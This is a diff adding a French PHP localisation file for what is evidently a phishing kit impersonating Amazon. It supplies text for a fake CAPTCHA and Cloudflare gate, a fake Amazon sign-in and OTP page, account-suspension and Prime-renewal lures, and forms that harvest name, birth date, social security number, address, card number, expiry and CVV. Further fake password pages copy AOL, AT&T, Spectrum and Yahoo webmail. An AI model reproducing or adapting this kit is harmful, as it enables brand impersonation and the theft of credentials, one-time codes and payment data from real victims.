@@ -1,0 +1,386 @@
+<?php
+// CAPTCHA
+$lang['captcha']['title']           = "Attention requise ! | Vérification de sécurité";
+$lang['captcha']['checking']        = "Vérification de votre navigateur avant d'accéder...";
+$lang['captcha']['titlepage']       = "Je ne suis pas un robot";
+$lang['captcha']['recaptcha']       = "reCAPTCHA";
+$lang['captcha']['privacy']         = "Confidentialité • Conditions";
+$lang['captcha']['aboutthepage']    = "À propos de cette page";
+$lang['captcha']['verify_action']   = "Vérifiez que vous êtes humain en complétant l'action ci-dessous.";
+$lang['captcha']['notedthepage']    = "Nos systèmes ont détecté un trafic inhabituel provenant de votre réseau informatique. Cette page vérifie qu'il s'agit bien de vous qui envoyez les requêtes, et non d'un robot.";
+$lang['captcha']['ipaddress']       = "Adresse IP :";
+$lang['captcha']['date']            = "Date & Heure :";
+$lang['captcha']['verifying']       = "Vérification...";
+$lang['captcha']['verified']        = "Vérifié";
+
+// CLOUDFLARE
+$lang['cloudflare']['name']          = "Cloudflare";
+$lang['cloudflare']['title']         = "Un instant...";
+$lang['cloudflare']['titlepage']     = "Vérification que vous êtes humain. Cela peut prendre quelques secondes.";
+$lang['cloudflare']['verifyhuman']   = "Vérifiez que vous êtes humain";
+$lang['cloudflare']['privacy']       = "Confidentialité • Conditions";
+$lang['cloudflare']['verify_action'] = "Vérifiez que vous êtes humain en complétant l'action ci-dessous.";
+$lang['cloudflare']['verify_message']= "doit vérifier la sécurité de votre connexion.";
+$lang['cloudflare']['verifying']     = "Vérification...";
+$lang['cloudflare']['success']       = "Succès";
+$lang['cloudflare']['enable']        = "Activez JavaScript et les cookies pour continuer";
+$lang['cloudflare']['know']          = "Le saviez-vous ?";
+$lang['cloudflare']['bottraffic']    = "Des entreprises utilisent-elles l'apprentissage automatique pour identifier et se défendre contre le trafic de robots ?";
+$lang['cloudflare']['rayid']         = "Ray ID :";
+
+// PAGE LOGIN
+$lang['login']['language']           = "Français";
+$lang['login']['title']              = "Connexion Amazon";
+$lang['login']['signin']             = "Se connecter";
+$lang['login']['titlealertsignin']   = "Un problème est survenu";
+$lang['login']['alertsignin']        = "Nous ne trouvons pas de compte avec cette adresse e-mail";
+$lang['login']['emailorphone']       = "Adresse e-mail ou numéro de téléphone portable";
+$lang['login']['usernameEmpty']      = "Entrez votre adresse e-mail ou votre numéro de téléphone portable";
+$lang['login']['usernameInvalid']    = "Entrez une adresse e-mail ou un numéro de téléphone valide";
+$lang['login']['continue']           = "Continuer";
+$lang['login']['continuing']         = "En continuant, vous acceptez les";
+$lang['login']['forgot']             = "Mot de passe oublié ?";
+$lang['login']['other']              = "Autres problèmes de connexion";
+$lang['login']['change']             = "Changer";
+$lang['login']['password']           = "Mot de passe";
+$lang['login']['passwordEmpty']      = "Entrez votre mot de passe";
+$lang['login']['passwordInvalid']    = "Le mot de passe doit contenir au moins 8 caractères";
+$lang['login']['or']                 = "ou";
+$lang['login']['passkey']            = "Se connecter avec une clé d'accès";
+$lang['login']['showpassword']       = "Afficher le mot de passe";
+$lang['login']['buyer']              = "Achetez-vous pour le travail ?";
+$lang['login']['shop']               = "Acheter sur Amazon Business";
+$lang['login']['new']                = "Nouveau sur Amazon ?";
+$lang['login']['create']             = "Créez votre compte Amazon";
+$lang['login']['conditions']         = "Conditions d'utilisation";
+$lang['login']['privacy']            = "Avis de confidentialité";
+$lang['login']['cookies']            = "Avis relatif aux cookies";
+$lang['login']['needhelp']           = "Besoin d'aide ?";
+$lang['login']['help']               = "Aide";
+$lang['login']['copyright']          = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE OTP
+$lang['otp']['language']             = "Français";
+$lang['otp']['title']                = "Amazon : Vérification en deux étapes";
+$lang['otp']['titleotp']             = "Vérification en deux étapes";
+$lang['otp']['pagetitle']            = "Pour votre sécurité, nous avons envoyé le code à votre e-mail";
+$lang['otp']['phonepagetitle']       = "Pour plus de sécurité, veuillez saisir le code unique (OTP) qui a été envoyé à un numéro de téléphone";
+$lang['otp']['titlepage']            = "Entrez le code OTP";
+$lang['otp']['otpcheckbox']          = " Ne pas demander de code OTP sur ce navigateur";
+$lang['otp']['titlealertotp']        = "Un problème est survenu";
+$lang['otp']['otpinvalid']           = "Le code que vous avez saisi n'est pas valide. Veuillez vérifier le code et réessayer.";
+$lang['otp']['waiting']              = "Veuillez attendre %s secondes avant de demander un autre code.";
+$lang['otp']['otpEmpty']             = "Saisissez le code de vérification";
+$lang['otp']['otpInvalid']           = "Entrez un code de vérification valide";
+$lang['otp']['submitcode']           = "Soumettre le code";
+$lang['otp']['wait']                 = "Veuillez patienter ...";
+$lang['otp']['needhelp']             = "Besoin d'aide ?";
+$lang['otp']['differentway']         = "Si vous ne pouvez pas recevoir le code, ou si vous avez changé votre e-mail ou numéro de téléphone, <a href='#gp'>essayez une autre méthode</a>.";
+$lang['otp']['conditions']           = "Conditions d'utilisation";
+$lang['otp']['privacy']              = "Avis de confidentialité";
+$lang['otp']['cookies']              = "Avis relatif aux cookies";
+$lang['otp']['help']                 = "Aide";
+$lang['otp']['copyright']            = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE UNUSUAL
+$lang['unusual']['language']             = "Français";
+$lang['unusual']['title']                = "Amazon : Activité inhabituelle";
+$lang['unusual']['titleunusual']         = "Nous avons détecté une activité inhabituelle sur votre compte Amazon";
+$lang['unusual']['pagetitle']            = "Nous vous suggérons quelques étapes avant d'accéder à votre compte Amazon en toute sécurité.";
+$lang['unusual']['step1']                = "Étape 1";
+$lang['unusual']['infostep1']            = "Vérifiez vos informations d'adresse de facturation";
+$lang['unusual']['alertstep1']           = "Vérifiez l'adresse de facturation liée à votre compte Amazon.";
+$lang['unusual']['step2']                = "Étape 2";
+$lang['unusual']['infostep2']            = "Vérifiez votre mode de paiement";
+$lang['unusual']['alertstep2']           = "Il semble que quelqu'un ait modifié ou utilisé le mode de paiement de votre compte Amazon. Nous avons donc besoin que vous fournissiez les informations de paiement liées à votre compte Amazon.";
+$lang['unusual']['verifnow']             = "Vérifier maintenant";
+$lang['unusual']['needhelp']             = "Besoin d'aide ?";
+$lang['unusual']['differentway']         = "Si vous n'êtes pas sûr de cette activité inhabituelle, suivez les instructions pour protéger votre compte.";
+$lang['unusual']['conditions']           = "Conditions d’utilisation";
+$lang['unusual']['privacy']              = "Avis de confidentialité";
+$lang['unusual']['cookies']              = "Avis sur les cookies";
+$lang['unusual']['help']                 = "Aide";
+$lang['unusual']['copyright']            = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE SUSPICIOUS
+$lang['suspicious']['language']          = "Français";
+$lang['suspicious']['title']             = "Amazon : Problème de facturation";
+$lang['suspicious']['titlesuspicious']   = "Votre compte Amazon est suspendu en raison d’un problème de facturation";
+$lang['suspicious']['pagetitle']         = "Veuillez suivre les étapes ci-dessous pour mettre à jour votre mode de paiement.";
+$lang['suspicious']['step1']             = "Étape 1";
+$lang['suspicious']['infostep1']         = "Mettez à jour vos informations d'adresse de facturation";
+$lang['suspicious']['alertstep1']        = "Mettez à jour l'adresse de facturation liée à votre compte Amazon.";
+$lang['suspicious']['step2']             = "Étape 2";
+$lang['suspicious']['infostep2']         = "Mettez à jour votre mode de paiement";
+$lang['suspicious']['alertstep2']        = "Il semble que quelqu'un ait modifié ou utilisé le mode de paiement de votre compte Amazon. Nous avons donc besoin que vous vérifiiez les informations de paiement liées à votre compte Amazon.";
+$lang['suspicious']['verifnow']          = "Vérifier maintenant";
+$lang['suspicious']['needhelp']          = "Besoin d'aide ?";
+$lang['suspicious']['differentway']      = "Si vous ne reconnaissez pas cette activité ou si vous ne savez pas quoi faire, suivez les étapes fournies pour sécuriser votre compte.";
+$lang['suspicious']['conditions']        = "Conditions d’utilisation";
+$lang['suspicious']['privacy']           = "Avis de confidentialité";
+$lang['suspicious']['help']              = "Aide";
+$lang['suspicious']['copyright']         = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE LOCKED
+$lang['locked']['language']              = "Français";
+$lang['locked']['title']                 = "Amazon : Accès verrouillé";
+$lang['locked']['titlelocked']           = "Votre compte a été verrouillé pour des raisons de sécurité";
+$lang['locked']['pagetitle']             = "Pour déverrouiller votre compte Amazon, nous vous recommandons de suivre immédiatement les étapes suivantes.";
+$lang['locked']['step1']                 = "Étape 1";
+$lang['locked']['infostep1']             = "Vérifiez vos informations d'adresse de facturation";
+$lang['locked']['alertstep1']            = "Vérifiez l'adresse de facturation liée à votre compte Amazon.";
+$lang['locked']['step2']                 = "Étape 2";
+$lang['locked']['infostep2']             = "Vérifiez votre mode de paiement";
+$lang['locked']['alertstep2']            = "Il semble que quelqu'un ait modifié ou utilisé le mode de paiement de votre compte Amazon. Nous avons donc besoin que vous vérifiiez les informations de paiement liées à votre compte Amazon.";
+$lang['locked']['verifnow']              = "Vérifier maintenant";
+$lang['locked']['needhelp']              = "Besoin d'aide ?";
+$lang['locked']['differentway']          = "Si vous pensez que cette limitation est une erreur ou si vous n'êtes pas sûr de la raison, suivez les instructions pour examiner et sécuriser votre compte.";
+$lang['locked']['conditions']            = "Conditions d’utilisation";
+$lang['locked']['privacy']               = "Avis de confidentialité";
+$lang['locked']['help']                  = "Aide";
+$lang['locked']['copyright']             = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE PRIME
+$lang['prime']['language']              = "Français";
+$lang['prime']['title']                 = "Amazon : Abonnement Prime suspendu";
+$lang['prime']['titleprime']            = "Votre abonnement Amazon Prime doit être renouvelé le " . date("j F Y") . "";
+$lang['prime']['pagetitle']             = "Veuillez suivre les étapes ci-dessous pour mettre à jour votre mode de paiement.";
+$lang['prime']['step1']                 = "Étape 1";
+$lang['prime']['infostep1']             = "Mettez à jour vos informations d'adresse de facturation";
+$lang['prime']['alertstep1']            = "Mettez à jour l'adresse de facturation liée à votre compte Amazon.";
+$lang['prime']['step2']                 = "Étape 2";
+$lang['prime']['infostep2']             = "Mettez à jour votre mode de paiement";
+$lang['prime']['alertstep2']            = "Nous avons constaté que la carte associée à votre abonnement Prime n’est plus valide. Nous avons donc besoin que vous mettiez à jour vos informations de paiement.";
+$lang['prime']['resume']                = "Reprendre l'abonnement";
+$lang['prime']['needhelp']              = "Besoin d'aide ?";
+$lang['prime']['differentway']          = "Essayez une autre méthode pour restaurer votre abonnement.";
+$lang['prime']['conditions']            = "Conditions d’utilisation";
+$lang['prime']['privacy']               = "Avis de confidentialité";
+$lang['prime']['help']                  = "Aide";
+$lang['prime']['copyright']             = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE BILLING HEADER
+$lang['billingheader']['language']          = "Français";
+$lang['billingheader']['titleaddress']      = "Amazon : Vérifier les adresses";
+$lang['billingheader']['titlepayment']      = "Amazon : Vérifier le paiement";
+$lang['billingheader']['deliverto']         = "Livrer à";
+$lang['billingheader']['done']              = "Terminé";
+$lang['billingheader']['all']               = "Tout";
+$lang['billingheader']['selectdepartment']  = "Sélectionnez le département que vous souhaitez rechercher";
+$lang['billingheader']['alldepartment']     = "Tous les départements";
+$lang['billingheader']['artscrafts']        = "Arts et loisirs créatifs";
+$lang['billingheader']['automotive']        = "Automobile";
+$lang['billingheader']['baby']              = "Bébé";
+$lang['billingheader']['beautypersonal']    = "Beauté et soins personnels";
+$lang['billingheader']['books']             = "Livres";
+$lang['billingheader']['boysfashion']       = "Mode garçons";
+$lang['billingheader']['computers']         = "Informatique";
+$lang['billingheader']['deals']             = "Promotions";
+$lang['billingheader']['digitalmusic']      = "Musique numérique";
+$lang['billingheader']['electronics']       = "Électronique";
+$lang['billingheader']['girlsfashion']      = "Mode filles";
+$lang['billingheader']['health']            = "Santé et maison";
+$lang['billingheader']['homekitchen']       = "Maison et cuisine";
+$lang['billingheader']['industrial']        = "Industrie et sciences";
+$lang['billingheader']['searchamazon']      = "Rechercher sur Amazon";
+$lang['billingheader']['hello']             = "Bonjour,";
+$lang['billingheader']['accountlist']       = "Listes de comptes";
+$lang['billingheader']['returns']           = "Retours";
+$lang['billingheader']['orders']            = "Commandes";
+$lang['billingheader']['rufus']             = "Rufus";
+$lang['billingheader']['todaysdeals']       = "Offres du jour";
+$lang['billingheader']['primevideo']        = "Prime Video";
+$lang['billingheader']['buyagain']          = "Acheter à nouveau";
+$lang['billingheader']['customerservice']   = "Service client";
+$lang['billingheader']['registry']          = "Liste de cadeaux";
+$lang['billingheader']['giftcard']          = "Cartes cadeaux";
+$lang['billingheader']['sell']              = "Vendre";
+$lang['billingheader']['disability']        = "Assistance clients en situation de handicap";
+$lang['billingheader']['alertaccount']      = "Compte temporairement suspendu";
+$lang['billingheader']['noticealertaccount']    = "Nous avons constaté une activité de paiement inhabituelle sur votre compte et devons vérifier la propriété du moyen de paiement utilisé pour votre dernière commande.";
+
+// PAGE BILLING PAGE
+$lang['billingpage']['verifyaddress']       = "Vérifier l'adresse";
+$lang['billingpage']['verifypayment']       = "Vérifier le paiement";
+$lang['billingpage']['complete']            = "Terminé";
+$lang['billingpage']['titleverifyaddress']  = "Confirmez votre identité";
+$lang['billingpage']['enterinformation']    = "Veuillez saisir les informations correspondant à votre compte.";
+$lang['billingpage']['country']             = "Pays/Région";
+$lang['billingpage']['fullname']            = "Nom complet (Prénom et Nom)";
+$lang['billingpage']['alertfullname']       = "Veuillez entrer un nom.";
+$lang['billingpage']['checkalertfullname']  = "Veuillez vérifier le nom complet (prénom et nom).";
+$lang['billingpage']['dob']                 = "Date de naissance";
+$lang['billingpage']['alertdob']            = "Veuillez entrer une date de naissance.";
+$lang['billingpage']['checkalertdob']       = "Veuillez vérifier la date de naissance.";
+$lang['billingpage']['invalidalertdob']     = "Date invalide. Veuillez vérifier le format JJ/MM/AAAA.";
+$lang['billingpage']['dobmust17th']         = "Vous devez avoir au moins 17 ans.";
+$lang['billingpage']['ssn']                 = "Numéro de sécurité sociale";
+$lang['billingpage']['phonenumber']         = "Numéro de téléphone";
+$lang['billingpage']['alertphonenumber']    = "Veuillez entrer un numéro de téléphone afin que nous puissions vous appeler en cas de problème de livraison.";
+$lang['billingpage']['assistdelivery']      = "Peut être utilisé pour faciliter la livraison";
+$lang['billingpage']['addressline1']        = "Adresse ligne 1";
+$lang['billingpage']['alertaddressline1']   = "Veuillez entrer l'adresse (ligne 1).";
+$lang['billingpage']['placeaddressline1']   = "Rue ou boîte postale";
+$lang['billingpage']['addressline2']        = "Adresse ligne 2";
+$lang['billingpage']['placeaddressline2']   = "Appartement, suite, bâtiment, étage, etc.";
+$lang['billingpage']['city']                = "Ville";
+$lang['billingpage']['alertcity']           = "Veuillez entrer un nom de ville.";
+$lang['billingpage']['state']               = "État/Province/Région";
+$lang['billingpage']['alertstate']          = "Veuillez entrer un état/province.";
+$lang['billingpage']['zipcode']             = "Code postal";
+$lang['billingpage']['alertzipcode']        = "Veuillez entrer un code postal.";
+$lang['billingpage']['thismydefault']       = "Ceci est mon adresse par défaut";
+$lang['billingpage']['backtotop']           = "Haut de page";
+
+// PAGE PAYMENT PAGE
+$lang['paymentpage']['verifyaddress']       = "Vérifier l'adresse";
+$lang['paymentpage']['verifypayment']       = "Vérifier le paiement";
+$lang['paymentpage']['complete']            = "Terminé";
+$lang['paymentpage']['titleverifypayment']  = "Confirmez votre carte de crédit ou de débit";
+$lang['paymentpage']['enterinformation']    = "Veuillez saisir les informations correspondant à votre compte.";
+$lang['paymentpage']['reviewpayment']       = "Vérifiez votre carte de crédit ou de débit";
+$lang['paymentpage']['paymentreview']       = "Nous n'avons pas pu vérifier votre carte. Veuillez utiliser une autre carte et vous assurer que les informations sont correctes avant d'enregistrer.";
+$lang['paymentpage']['cardname']            = "Nom figurant sur la carte";
+$lang['paymentpage']['alertcardname']       = "Veuillez entrer un nom de carte.";
+$lang['paymentpage']['checkalertcardname']  = "Veuillez vérifier le nom de la carte.";
+$lang['paymentpage']['placecardname']       = "Nom sur la carte";
+$lang['paymentpage']['cardnumber']          = "Numéro de carte";
+$lang['paymentpage']['alertcardnumber']     = "Veuillez entrer un numéro de carte.";
+$lang['paymentpage']['checkalertcardnumber']    = "Numéro de carte invalide, veuillez entrer un numéro valide.";
+$lang['paymentpage']['cardexp']             = "Date d'expiration";
+$lang['paymentpage']['requirecardexp']      = "Veuillez entrer une date d'expiration.";
+$lang['paymentpage']['cardexpmust1and12']   = "Le mois d'expiration doit être compris entre 01 et 12.";
+$lang['paymentpage']['cardexpmust22and35']  = "L'année d'expiration doit être comprise entre 25 et 35.";
+$lang['paymentpage']['cardexpinvalid']      = "Veuillez entrer une date d'expiration valide.";
+$lang['paymentpage']['cvv']                 = "Saisir le CVV";
+$lang['paymentpage']['alertcvv']            = "Veuillez entrer un CVV/CSC.";
+$lang['paymentpage']['checkalertcvv']       = "Saisissez un CVV/CSC de 3 à 4 chiffres.";
+$lang['paymentpage']['placecvv']            = "Code à 3-4 chiffres";
+$lang['paymentpage']['youraddress']         = "Vos adresses";
+$lang['paymentpage']['infopayment']         = "Vos informations sont chiffrées et sécurisées";
+$lang['paymentpage']['alertinfopayment']    = "Pour éviter les interruptions de service, la carte ajoutée peut être utilisée comme méthode de paiement de secours. Vous pouvez modifier ce paramètre dans Vos paiements à tout moment.";
+$lang['paymentpage']['yourinfoname']        = "Nom complet";
+$lang['paymentpage']['yourinfoaddress']     = "Adresse";
+$lang['paymentpage']['yourinfocountry']     = "Pays";
+$lang['paymentpage']['backtotop']           = "Haut de page";
+
+// PAGE COMPLETED
+$lang['completed']['verifyaddress']       = "Vérifier l'adresse";
+$lang['completed']['verifypayment']       = "Vérifier le paiement";
+$lang['completed']['complete']            = "Terminé";
+$lang['completed']['titlecomplete']       = "Votre vérification est terminée";
+$lang['completed']['infocomplete']        = "Nous vous informerons par e-mail dès que votre compte sera vérifié.";
+$lang['completed']['backtotop']           = "Haut de page";
+
+// PAGE BILLING FOOTER
+$lang['billingfooter']['gettoknow']         = "Faites connaissance avec nous";
+$lang['billingfooter']['careers']           = "Carrières";
+$lang['billingfooter']['blog']              = "Blog";
+$lang['billingfooter']['aboutamazon']       = "À propos d'Amazon";
+$lang['billingfooter']['investor']          = "Relations investisseurs";
+$lang['billingfooter']['amazondevices']     = "Appareils Amazon";
+$lang['billingfooter']['amazonscience']     = "Amazon Science";
+$lang['billingfooter']['makemoney']         = "Gagnez de l'argent avec nous";
+$lang['billingfooter']['sellproducts']      = "Vendre des produits sur Amazon";
+$lang['billingfooter']['sellbusiness']      = "Vendre sur Amazon Business";
+$lang['billingfooter']['sellapps']          = "Vendre des applications sur Amazon";
+$lang['billingfooter']['becomeaffiliate']   = "Devenez affilié";
+$lang['billingfooter']['advertise']         = "Faites la publicité de vos produits";
+$lang['billingfooter']['selfpublish']       = "Auto-éditer avec nous";
+$lang['billingfooter']['hostamazonhub']     = "Hébergez un Amazon Hub";
+$lang['billingfooter']['seemore']           = "Voir plus : gagnez de l'argent avec nous";
+$lang['billingfooter']['amazonpayment']     = "Produits de paiement Amazon";
+$lang['billingfooter']['amazonbusiness']    = "Carte Amazon Business";
+$lang['billingfooter']['shopwithpoints']    = "Achetez avec des points";
+$lang['billingfooter']['reloadbalance']     = "Recharger votre solde";
+$lang['billingfooter']['amazoncurrency']    = "Convertisseur de devises Amazon";
+$lang['billingfooter']['letushelp']         = "Laissez-nous vous aider";
+$lang['billingfooter']['youraccount']       = "Votre compte";
+$lang['billingfooter']['yourorders']        = "Vos commandes";
+$lang['billingfooter']['shippingrates']     = "Tarifs et politiques d'expédition";
+$lang['billingfooter']['returnsreplace']    = "Retours et remplacements";
+$lang['billingfooter']['manageyourcontent'] = "Gérer votre contenu et vos appareils";
+$lang['billingfooter']['help']              = "Aide";
+$lang['billingfooter']['language']          = "Français";
+$lang['billingfooter']['symbolmoney']       = "€";
+$lang['billingfooter']['money']             = "EUR - Euro";
+$lang['billingfooter']['conditions']        = "Conditions d'utilisation";
+$lang['billingfooter']['privacy']           = "Avis de confidentialité";
+$lang['billingfooter']['consumer']          = "Divulgation sur la confidentialité des données de santé des consommateurs";
+$lang['billingfooter']['adsprivacy']        = "Vos choix en matière de publicité";
+$lang['billingfooter']['copyright']         = "© 1996-" . date("Y") . ", Amazon.com, Inc. ou ses affiliés";
+
+// PAGE AOL
+$lang['emailaol']['title']          = "AOL";
+$lang['emailaol']['enterpassword']  = "Entrez le mot de passe";
+$lang['emailaol']['finishsignin']   = "pour terminer la connexion";
+$lang['emailaol']['inputpassword']  = "Mot de passe";
+$lang['emailaol']['alertfailed']    = "Mot de passe invalide, veuillez réessayer.";
+$lang['emailaol']['next']           = "Suivant";
+$lang['emailaol']['forgot']         = "Mot de passe oublié ?";
+$lang['emailaol']['legacy']         = "AOL fonctionne mieux avec les dernières versions des navigateurs. Vous utilisez un navigateur obsolète ou non pris en charge et certaines fonctionnalités d'AOL peuvent ne pas fonctionner correctement. Veuillez mettre à jour votre navigateur maintenant. <a href='#'>Plus d'infos</a>";
+
+// PAGE ATT
+$lang['emailatt']['title']          = "Login Screen";
+$lang['emailatt']['signin']         = "Sign in";
+$lang['emailatt']['tomyatt']        = "to myAT&T";
+$lang['emailatt']['alertfailed']    = "Incorrect Password, Try again.";
+$lang['emailatt']['carealert']      = "Care code: ";
+$lang['emailatt']['inputpassword']  = "Password";
+$lang['emailatt']['show']           = "Show";
+$lang['emailatt']['keepsignin']     = "Keep me signed in";
+$lang['emailatt']['forgot']         = "Forgot user ID?";
+$lang['emailatt']['donthave']       = "Don't have a user ID?";
+$lang['emailatt']['createone']      = "Create one now";
+$lang['emailatt']['paywithout']     = "Pay without signing in";
+$lang['emailatt']['legal']          = "Legal policy center";
+$lang['emailatt']['privacy']        = "Privacy policy";
+$lang['emailatt']['terms']          = "Terms of use";
+$lang['emailatt']['accessibility']  = "Accessibility";
+$lang['emailatt']['privacychoice']  = "Your privacy choices";
+$lang['emailatt']['copyright']      = "AT&T Intellectual Property. All rights reserved.";
+
+// PAGE CHARTER
+$lang['emailcharter']['title']          = "Login TWC & Roadrunner RR Email | Spectrum Webmail";
+$lang['emailcharter']['skiptocontent']  = "Skip to Main Content";
+$lang['emailcharter']['menu']           = "MENU";
+$lang['emailcharter']['manageaccount']  = "Manage Account";
+$lang['emailcharter']['getsupport']     = "Get Support";
+$lang['emailcharter']['watchtv']        = "Watch TV";
+$lang['emailcharter']['support']        = "Support";
+$lang['emailcharter']['signintomail']   = "Sign In to Webmail";
+$lang['emailcharter']['createemail']    = "Create an Email Address";
+$lang['emailcharter']['emailaddress']   = "Email Address";
+$lang['emailcharter']['emailpassword']  = "Email Password";
+$lang['emailcharter']['signin']         = "Sign In";
+$lang['emailcharter']['forgotemail']    = "Forgot Email Address?";
+$lang['emailcharter']['forgotpassword'] = "Forgot Email Password?";
+$lang['emailcharter']['copyright']      = "2022 Charter Communications. All rights reserved";
+$lang['emailcharter']['withus']         = "Advertise with Us";
+$lang['emailcharter']['privacy']        = "Your Privacy Rights";
+$lang['emailcharter']['policy']         = "Web Privacy Policy";
+$lang['emailcharter']['dontsell']       = "California Consumer Do Not Sell Or Share My Personal Information";
+$lang['emailcharter']['limittheuse']    = "California Consumer Limit The Use Of My Sensitive Personal Information";
+$lang['emailcharter']['subscriber']     = "Spectrum Subscriber Policies";
+$lang['emailcharter']['inc']            = "Time Warner Cable and the Time Warner Cable logo are trademarks of Time Warner Inc., used under license.";
+
+// PAGE HOT FAMILY
+$lang['emailhotfams']['title']              = "Connectez-vous à votre compte";
+$lang['emailhotfams']['enterpassword']      = "Saisir le mot de passe";
+$lang['emailhotfams']['alertfailed']        = "Mot de passe invalide, veuillez réessayer.";
+$lang['emailhotfams']['forgot']             = "Mot de passe oublié";
+$lang['emailhotfams']['signin']             = "Se connecter";
+$lang['emailhotfams']['terms']              = "Conditions d'utilisation";
+$lang['emailhotfams']['privacy']            = "Cookies et confidentialité";
+$lang['emailhotfams']['...']                = "...";
+
+// PAGE Yahoo
+$lang['emailyahoo']['title']            = "Yahoo";
+$lang['emailyahoo']['enterpassword']    = "Entrez le mot de passe";
+$lang['emailyahoo']['finishsignin']     = "pour terminer la connexion";
+$lang['emailyahoo']['inputpassword']    = "Mot de passe";
+$lang['emailyahoo']['alertfailed']      = "Mot de passe invalide, veuillez réessayer.";
+$lang['emailyahoo']['next']             = "Suivant";
+$lang['emailyahoo']['forgot']           = "Mot de passe oublié ?";
+$lang['emailyahoo']['legacy']           = "Yahoo fonctionne mieux avec les dernières versions des navigateurs. Vous utilisez un navigateur obsolète ou non pris en charge et certaines fonctionnalités de Yahoo peuvent ne pas fonctionner correctement. Veuillez mettre à jour votre navigateur maintenant. <a href='#'>Plus d'infos</a>";
+?>
